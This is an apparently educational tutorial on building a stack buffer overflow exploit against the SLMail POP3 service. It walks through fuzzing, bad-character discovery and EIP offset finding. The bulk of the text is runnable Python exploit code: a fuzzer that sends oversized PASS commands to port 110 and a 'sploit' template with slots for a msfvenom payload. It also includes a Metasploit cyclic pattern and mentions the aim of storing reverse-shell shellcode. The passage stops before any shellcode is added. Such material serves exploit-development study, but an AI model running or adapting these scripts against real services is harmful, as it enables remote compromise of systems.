Simple Buffer Overflow Attack
================================================================================


Getting Started
================================================================================

Fuzzing to find buffer overflows or other *'input causes unintentional behavior'*-style bugs typically involves crafting variable-sized inputs for the targeted program, sending them to the program, and analyzing the behavior. Eventually, you'll be able to fine-tune your inputs just right so you can control the resulting behavior.

### Ideal setup

You want to replicate the target environment if possible, matching OS, processor type, maybe memory size, but certainly the program you want to exploit. You also want a debugger running on this machine to simplify the debugging process. Note that you will repeatedly crash the replicated target program, so maybe you want an easy restart script--or just restart the system itself.

You also want a well-suited development environment like Kali to craft your buffer inputs. As seen below, Kali includes some make-your-life-easier tools for this endeavor. Furthermore, many services you'd like to exploit are network-based, and you would ideally interact with them over the network (from your Kali machine to the target machine) the same way you intend to do on the actual, live system.

### Recommended debuggers

* **Linux:**    The Evans Debugger, aka EDB or edb
* **Windows:**  Immunity Debugger

### Unknown protocols

If you're unfamiliar with the protocol in use (e.g., it's not something simple like SMTP on port 25), then you should look up the associated RFC that describes the protocol in depth. Another option is to learn the critical/relevant aspects of the protocol yourself by monitoring traffic in wireshark.

### Gotchas

While not insurmountable, two characteristics will make your life harder if the target program was developed to use them:

1. DEP (data execution prevention) is a set of hardware and software technologies that perform additional checks on memory to help prevent malicious code from running on a system. The primary benefit of DEP is to help prevent code execution from data pages by raising an exception when execution occurs in something that was supposed to be data.
 
2. ASLR randomizes the base addresses of loaded applications and DLLs every time the operating system is booted. That means you can't count on pointing to a specific memory address in your buffer overflow exploit.

Part I: Fuzzing
================================================================================

### [1] Write fuzzing script in Python that interacts with the target service.

Have the script send increasingly-large input contents in order to overrun the buffer set aside by the service for that input. Determine, based on your script's output, what the size of the last-sent buffer input was. The buffer overflow point is somewhere between the second-to-last buffer input and the last buffer input.

Before you run this script (can be on same machine or different machine from the machine that is running the target service), make sure you have a debugger running on the target machine and attached to the target service. As you run the script, the debugger will show you the value of EIP (extended instruction pointer) and ESP (extended stack pointer). When the service crashes, you want the EIP to be completely full of ASCII A character values (0x41). That means that you have sent enough input length into the service's buffer to overflow that buffer and begin wriiiting to the EIP, which can control the next bit of program execution flow. Make sure EIP = AAAA... when the program crashes, otherwise you might not have a successful buffer target.

Example script (fuzzes SLMail.exe on Windows):

```
root@kali:~# vim fuzz.py
```

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Create buffers
# Makes list of 30 buffers: 1, 100, then += 200.
buffers = ["A"]
counter = 100
while len(buffers) <= 30:
  buffers.append("A" * counter)
  counter += 200

#################### Execute the fuzzing
for buffer in buffers:
  printinfo(["Fuzzing PASS with", len(buffer), "bytes ..."])
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect((sys.argv[1], 110))
  s.recv(1024)
  s.send('USER test\r\n')
  s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  s.send('QUIT\r\n')
  s.close()
```

### [2] Write initial exploit script in Python. 

Once you know the value (last value sent) that causes buffer overflow and service crash, you can write a skeleton script that initially sends only that value. This isn't necessary, but it reduces complexity in some larger overflow cases. This helps you replicate the crash over and over, AND it helps you by providing a basis for custom buffer overflow input.

*I'm aware that this script is not very "Pythonic" and is clunky. Adding all string values directly into this single script can greatly reduce complexity during this process.*

```
root@kali:~# vim sploit.py
```

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Variables
ip = sys.argv[1]   # string argument
port = 110         # int

# Initialize string of UTF hex values \x01 thru \xff for badchar testing:
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#
# PATTERN
# Paste pattern_create command next line and pattern beneath.
# 

#
# PAYLOAD
# Paste msfvenom command next line, payload info beneath, then payload.
# 

#################### Exploit
# Target crashes at "A" * 2700____________________ (# bytes: qty of char "A")
# Badchars: ______________________________________ (\xXX hex string)
# Pattern-generated EIP: _________________________ (4 bytes in hex)
# Specific offset (splat) is _____________________ (# bytes)
# Usable JMP ESP at ______________________________ (little-endian hex addr)

sploit  = ""
sploit += ""           # protocol reqts
sploit += ""           # badchar test
sploit += ""           # pattern_create
sploit += "A" * 2700   # splat
sploit += ""           # eip
sploit += ""           # nopsled
sploit += ""           # payload
sploit += ""           # nopsled

#################### Communication

# Standup
printinfo(["Creating socket ..."])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
printinfo(["Connecting to", ip, "on port", port, "..."])
connect = s.connect((ip, port))
s.recv(1024)

# Interact
printinfo(["Sending username \"test\" ..."])
s.send('USER test\r\n')
s.recv(1024)
printinfo(["Sending password of", len(sploit), "bytes..."])
s.send('PASS ' + sploit + '\r\n')

# Result
printresult(["Exploit sent. Attack complete."])

# Teardown
printinfo(["Quitting connection."])
s.send('QUIT\r\n')
s.close()
```

Part II: Bad Characters
================================================================================

Use your existing script and modify the input data your script sends to the target program. Replace the first 255 of your As (overflowinput in our example script) with hex bytes for values 0x01 through 0xff. (We omit \x00 since the null byte is a very common bad character anyhow.)

After the buffer overflow is sent to the target application, use the debugger to view your payload (the hexidecimal byte values) in the application's memory space. It takes a minute without mona scripts, but ensure the full string of hex values is present. The
fastest way to do this is with a GUI text editor and some quick formatting. Any missing or modified values indicate a bad character is present in your string. Add it to the bad characters list.

It can pay to remove the bad characters from your string and test for character modification again--sometimes bad characters cause modification to other bytes in memory. You can repeat until every character you send appears in application memory. You now know all the characters you can and cannot use in your payload.

### [1] Generate the possible character string.

```
root@kali:~# vim badchars.py
```

```
#!/usr/bin/python
# Generates all bytes \x01 thru \xff on the command line.

key = bytearray([])  <--------------(Note that is '[' and ']' w/ no space.)
for v in range(1, 256): key.append(v)
print("".join("\\x%02x" % k for k in key))
```

Or, if you're reading this on your attack platform, just copy the below code block, which you can paste into your sploit script if creating your script from scratch.

```
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

### [2] Modify your sploit script.

*Note: Most of this step is only necessary if you're building your script from scratch, incrementally. The sploit.py script template above already contains the `chars` string. If using the template in this guide, you only have to assign the value of `chars` to the `sploit` variable.*

You'll initialize variable `chars`, which holds a string containing all those hex values. You'll then assign the contents of `chars` to the familiar variable `sploit` before adding in the "splat" offset (just to ensure you at least hit the criticala byte value and crash the application--later on the offset is refined and used literally as an offset).

```
root@kali:~# vim sploit.py
```

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Variables
ip = sys.argv[1]   # string argument
port = 110         # int

# Initialize string of UTF hex values \x01 thru \xff for badchar testing:
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#
# PATTERN
# Paste pattern_create command next line and pattern beneath.
# 

#
# PAYLOAD
# Paste msfvenom command next line, payload info beneath, then payload.
# 

#################### Exploit
# Target crashes at "A" * 2700____________________ (# bytes: qty of char "A")
# Badchars: ______________________________________ (\xXX hex string)
# Pattern-generated EIP: _________________________ (4 bytes in hex)
# Specific offset (splat) is _____________________ (# bytes)
# Usable JMP ESP at ______________________________ (little-endian hex addr)

sploit  = ""
sploit += ""           # protocol reqts
sploit += chars        # badchar test                                         #MOD
sploit += ""           # pattern_create
sploit += "A" * 2700   # splat
sploit += ""           # eip
sploit += ""           # nopsled
sploit += ""           # payload
sploit += ""           # nopsled

#################### Communication

# Standup
printinfo(["Creating socket ..."])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
printinfo(["Connecting to", ip, "on port", port, "..."])
connect = s.connect((ip, port))
s.recv(1024)

# Interact
printinfo(["Sending username \"test\" ..."])
s.send('USER test\r\n')
s.recv(1024)
printinfo(["Sending password of", len(sploit), "bytes..."])
s.send('PASS ' + sploit + '\r\n')

# Result
printresult(["Exploit sent. Attack complete."])

# Teardown
printinfo(["Quitting connection."])
s.send('QUIT\r\n')
s.close()
```

### [3] Execute script and identify bad characters.

In Kali:

```
root@kali:~# python sploit.py
```

In your debugging system, confirm the target app has crashed. Copy or save a hex dump of the stack, encompassing at least all 255 of the UTF character hex values and some of the offset (repeating letter A, or \x41). It will look like this:

```
...
      01DEFE64   0C0B0A09  ..
      01DEFE68   100F0E0D  .
      01DEFE6C   14131211
      01DEFE70   18171615
      01DEFE78   201F1E1D
      01DEFE7C   24232221  !"#$
      01DEFE80   28272625  %&'(
...
```

Transfer Ncat to the debugging machine. On Kali, run a temporary Python web server:

```
root@kali:~# cd /usr/share/windows-binaries/
root@kali:/usr/share/windows-binaries# python -m SimpleHTTPServer
```

Use Internet Explorer on the debugging machine to browse to and download Ncat at the URL `http://<KaliIpAddress>:8000/ncat.exe`. Save the file to the root C-drive directory, `C:\ncat.exe`.

Use Ncat to transfer text.

```
root@kali:~# ncat --ssl -nvlp 443
```

```
C:\Users\Admin>cd c:\
C:\>ncat.exe -nv 10.11.0.42 443 --ssl
```

Paste the hex dump as plaintext into the Windows side of the TCP tunnel. Copy the text on the Kali side and paste it into a txt file called “badcharsout.txt”.

Massage the hexdump file contents on your Kali machine.

```
(output=$(cat badcharsout.txt | cut -d" " -f 4 | fold -w2 | paste -sd'\n' - | sort); for line in $output; do echo -n '\x'; echo -n $line; done; echo) | fold -w 64 | paste -sd "\n"
```

Once you have the characters in a per-byte format you want, copy the output and paste it into a text editor. Above it, paste the badchars.py output. Use the GUI text editor to help you align columns quickly. You should be able to identify missing or modified bytes rapidly:

```
 all hex bytes except 0x00:
 --------------------------
    \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f
\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f
\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f
\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f
\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f
\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f
\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf
\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf
\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef
\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

hex bytes that made it into the stack                               badchars
-------------------------------------                               --------
    \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F <- \x00
\x10\x11\x12\x13\x14\x15\x16\x17\x18                \x1D\x1E\x1F <- \x19\x1a\x1b\x1c
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F
\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F
\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F
\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F
\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F
\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F
\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF
\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF
\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF
\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF
\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF
\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF
```

Now we know the bad characters string for this target is `\x00\x19\x1a\x1b\x1c`.

Part III: Control EIP
================================================================================

### Discussion

We want to dictate specifically what values (other than "AAAA") go into the EIP, which will give us control of the reins within the target program. We can use binary tree analysis, in which we make half of our buffer Bs, crash the program, and see whether the EIP is As or Bs, and then bracket in from there.

But, a faster way to determine which four bytes will actually wind up in the EIP is to use a unique string with a certain 3 to 4 byte pattern that enables us to know the index of a substring just by seeing the contents of the substring. Metasploit has a ruby script to help us with the pattern creation, and that's what we'll use. (Note that, while unlikely, it’s possible that some of the standard ASCII characters employed in the pattern creation tool are also bad characters on the target. If you run into problems, look into it.)

We'll also go beyond the EIP. Use the offset learned from these tools to build a buffer input of 'offset' + 'the data you want in EIP, such as BBBB' + '~400 Cs'. We'll run the script with that buffer input, confirm EIP shows our intended value (as a double check) and count the quantity of Cs shown in the hexdump. Ideally we'd have space in the application's data addresses for 350-400 Cs, which would enable later storage of 350-400 bytes' worth of reverse-shell shellcode without having to jump back to our offset space for payload placement.

### [1] Send position-determinative pattern and compute buffer offset.

Generate your patterned byte string. Note the length we specify is based on
known-good length of buffer to crash the application. That is, we know we’re hitting EIP at some point with this input length. Copy the output of Metasploit's pattern_create script, using the critical length (2700 bytes) found during fuzzing.

*Note: Do not just copy the 2700-byte-long string below. Generate it yourself as the arguments supplied to pattern_create are required for accurate offset determination.*

```
root@kbox:~# echo -n "pattern  = "; /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 | sed 's/.*/\"&\"/' | sed 's/.\{62\}/&\"\npattern\ \+\=\ \"/g'
  pattern  = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A"
  pattern += "c0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0"
  pattern += "Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag"
  pattern += "1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1A"
  ...
```

Now modify your script, pasting the output of the above command into the pattern_create section.

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Variables
ip = sys.argv[1]   # string argument
port = 110         # int

# Initialize string of UTF hex values \x01 thru \xff for badchar testing:
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#
# PATTERN
# Paste pattern_create command next line and pattern beneath.
# echo -n "pattern  = "; ./pattern_create.rb -l 2700 | sed 's/.*/\"&\"/' |\   #MOD
# sed 's/.\{62\}/&\"\npattern\ \+\=\ \"/g'                                    #MOD
pattern  = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A"    #ADD
pattern += "c0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0"   #ADD
pattern += "Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag"   #ADD
pattern += "1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1A"   #ADD
pattern += "i2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2"   #ADD
pattern += "Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am"   #ADD
pattern += "3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3A"   #ADD
pattern += "o4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4"   #ADD
pattern += "Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As"   #ADD
pattern += "5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5A"   #ADD
pattern += "u6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6"   #ADD
pattern += "Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay"   #ADD
pattern += "7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7B"   #ADD
pattern += "a8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8"   #ADD
pattern += "Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be"   #ADD
pattern += "9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9B"   #ADD
pattern += "h0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0"   #ADD
pattern += "Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl"   #ADD
pattern += "1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1B"   #ADD
pattern += "n2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2"   #ADD
pattern += "Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br"   #ADD
